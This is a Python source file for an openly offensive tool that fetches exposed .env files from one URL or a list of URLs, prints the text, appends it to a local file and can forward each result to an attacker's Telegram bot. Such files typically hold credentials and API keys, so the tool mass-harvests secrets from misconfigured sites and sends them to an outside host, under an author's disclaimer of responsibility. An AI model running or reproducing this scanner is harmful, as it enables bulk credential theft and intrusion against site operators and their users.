import os
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
import argparse
import json
from xml.etree import ElementTree as ET
import shutil  # For terminal window width

"""
          #Author  : Hackfut
          #Contact : t.me/H4ckfutSec
          #Github  : https://github.com/HackfutSec
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]

"""
# Banner Text
banner = """

███████╗███╗░░██╗██╗░░░██╗
██╔════╝████╗░██║██║░░░██║
█████╗░░██╔██╗██║╚██╗░██╔╝
██╔══╝░░██║╚████║░╚████╔╝░
███████╗██║░╚███║░░╚██╔╝░░
╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
🅔🅝🅥 🅔🅝🅥 🅔🅝🅥 🅔🅝🅥 🅔🅝🅥 🅔🅝🅥 🅔🅝🅥

Description:
         Program to retrieve and display the content of a .env file.

"""

# Function to clear the terminal and display the banner centered
def clear_and_display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the terminal
    terminal_width = shutil.get_terminal_size().columns  # Get terminal width
    centered_banner = '\n'.join(line.center(terminal_width) for line in banner.splitlines())  # Center the banner
    print(Fore.GREEN + centered_banner + Style.RESET_ALL)  # Display the banner in green color

# Function to display the content of a .env file from a URL
def display_content_from_url(url, headers, auth=None, retries=3):
    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, auth=auth, timeout=5)
            response.raise_for_status()  # Check for HTTP errors (e.g., 404, 500)
            if response.status_code == 200:
                print(Fore.GREEN + f"\n[✓] Content found at the following URL: {url}" + Style.RESET_ALL)
                content = response.text

                # Use BeautifulSoup to extract the plain text from the HTML page
                soup = BeautifulSoup(content, 'html.parser')
                page_text = soup.get_text(separator='\n', strip=True)  # Extract all visible text from the page

                print("\nHTML page content (only visible text):")
                print(page_text)  # Display the full content without pagination
                return page_text
        except requests.Timeout:
            print(Fore.RED + f"\n[✘] The request timed out for {url}. Attempt {attempt + 1}/{retries}..." + Style.RESET_ALL)
        except requests.RequestException as err:
            print(Fore.RED + f"\n[✘] Error connecting to URL: {url}. Error: {err}" + Style.RESET_ALL)
        break
    return None

# Function to save content to a file
def save_to_file(content, filename="env.txt"):
    try:
        with open(filename, 'a') as file:  # 'a' to append without overwriting the existing content
            file.write(content + "\n\n")
        print(Fore.GREEN + f"\n[✓] Results saved to {filename}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\n[✘] Error saving to the file: {e}" + Style.RESET_ALL)

# Function to read links from a file
def read_urls_from_file(file_path):
    if not os.path.exists(file_path):
        print(Fore.RED + f"\n[✘] The file {file_path} does not exist." + Style.RESET_ALL)
        return []
    
    with open(file_path, 'r') as file:
        urls = file.readlines()
    
    return [url.strip() for url in urls if url.strip()]

# Function to send a message to Telegram
def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, params=params)
        if response.status_code == 200:
            print(Fore.GREEN + "\n[✓] Message sent to Telegram." + Style.RESET_ALL)
        else:
            print(Fore.RED + "\n[✘] Error sending message to Telegram." + Style.RESET_ALL)
    except requests.RequestException as err:
        print(Fore.RED + f"\n[✘] Error sending message to Telegram: {err}" + Style.RESET_ALL)

# Function to check the validity of the chat_id in Telegram
def is_valid_chat_id(bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={chat_id}"
    try:
        response = requests.get(url)
        return response.status_code == 200
    except requests.RequestException as err:
        print(Fore.RED + f"\n[✘] Error validating chat_id: {err}" + Style.RESET_ALL)
        return False

# Function to display help for the program
def print_help():
    help_text = Fore.GREEN + """

       [1] Test a single link.
       [2] Test a file containing multiple links.
       [4 ] Exit the program.

    """
    print(help_text)

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="Program to retrieve and display the content of a .env file.")
    parser.add_argument('--lines-per-page', type=int, default=20, help='Number of lines to display per page.')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout for HTTP requests.')
    return parser.parse_args()

# Main program function
def main():
    clear_and_display_banner()  # Clear terminal and display banner

    args = parse_args()

    # Ask the user if they want to send results to Telegram
    send_to_telegram = input(Fore.YELLOW + "\n[!] Do you want to send the results to your Telegram bot? (yes/no): " + Style.RESET_ALL).strip().lower()

    bot_token = ""
    chat_id = ""
    
    # If the user wants to send results to Telegram, ask for the token and chat_id
    if send_to_telegram == 'yes':
        bot_token = input(Fore.YELLOW + "\n[!] Enter your Telegram token: " + Style.RESET_ALL).strip()
        chat_id = input(Fore.YELLOW + "\n[!] Enter your Telegram chat ID: " + Style.RESET_ALL).strip()

        if not is_valid_chat_id(bot_token, chat_id):
            print(Fore.RED + "\n[✘] The chat ID or token is invalid!" + Style.RESET_ALL)
            return

    # Define headers before using them in both branches
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    while True:
        # Options menu
        print(Fore.GREEN + "\n\n[1] Test a single link.")
        print(Fore.CYAN + "\n[2] Test a file containing multiple links.")
        print(Fore.YELLOW + "\n[4 ] Exit the program." + Style.RESET_ALL)

        choice = input(Fore.YELLOW + "\n[<< ] Choose an option (1/2/3): " + Style.RESET_ALL).strip()

        if choice == '1':
            url = input(Fore.YELLOW + "\n[!] Enter the URL of the .env file: " + Style.RESET_ALL).strip()
            content = display_content_from_url(url, headers)
            if content:
                save_to_file(content)  # Save the content to the file
                if send_to_telegram == 'yes':
                    send_telegram_message(bot_token, chat_id, content)

        elif choice == '2':
            file_path = input(Fore.YELLOW + "\n[!] Enter the path of the file containing the links: " + Style.RESET_ALL).strip()

            # Read the links from the file
            urls = read_urls_from_file(file_path)

            if not urls:
                print(Fore.RED + "\n[✘] No valid links found in the file." + Style.RESET_ALL)
                continue

            # Process each URL
            for url in urls:
                print(Fore.YELLOW + f"\n[!] Processing URL: {url}" + Style.RESET_ALL)
                content = display_content_from_url(url, headers)
                
                if content:
                    result = f"\n[!] URL: {url}\n{content}\n"
                    save_to_file(result)  # Save the result to the file

                    # Option to send to Telegram
                    if send_to_telegram == 'yes':
                        send_telegram_message(bot_token, chat_id, result)
                else:
                    print(Fore.RED + f"\n[✘] The URL {url} could not be retrieved." + Style.RESET_ALL)

        elif choice == '3':
            print(Fore.GREEN + "\n[✓] Exiting the program." + Style.RESET_ALL)
            break

        else:
            print(Fore.RED + "\n[✘] Invalid option. Please try again." + Style.RESET_ALL)

    print(Fore.GREEN + "\n[✓] Processing completed." + Style.RESET_ALL)

if __name__ == '__main__':
    main()
